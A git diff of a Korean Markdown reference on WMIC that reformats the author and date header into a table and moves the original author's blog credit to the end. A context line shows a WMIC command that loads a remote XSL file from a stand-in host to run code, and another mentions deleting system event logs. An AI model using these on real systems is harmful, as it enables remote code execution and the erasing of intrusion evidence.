@@ -1,9 +1,11 @@
 # WMIC
-##### 원작자: 문광일 PM
-##### 링크: [KOROMOON][koromoonlink]
-[koromoonlink]: https://koromoon.blogspot.com/2018/11/wmic.html "Go koromoon"
-##### 작성자: 김평일 대리
-##### 작성일자: 2024년 4월 18일
+
+
+| 작성자       | 김평일 대리   |
+| --------- | ---------------- |
+| **작성 일자** | **2024년 4월 18일** |
+| **수정 일자** |                  |
+| **비고**    |                  |
 
 <br>
 <br>
@@ -407,3 +409,7 @@ nteventlog 별칭을 사용하여 시스템 로그를 삭제하는 데 사용할
 원격 위치 : `wmic os get /FORMAT:"https://example.com/koromoon.xsl"`<br>
 
 <br>
+
+##### 원작자: 문광일 PM
+##### 링크: [KOROMOON][koromoonlink]
+[koromoonlink]: https://koromoon.blogspot.com/2018/11/wmic.html "Go koromoon"
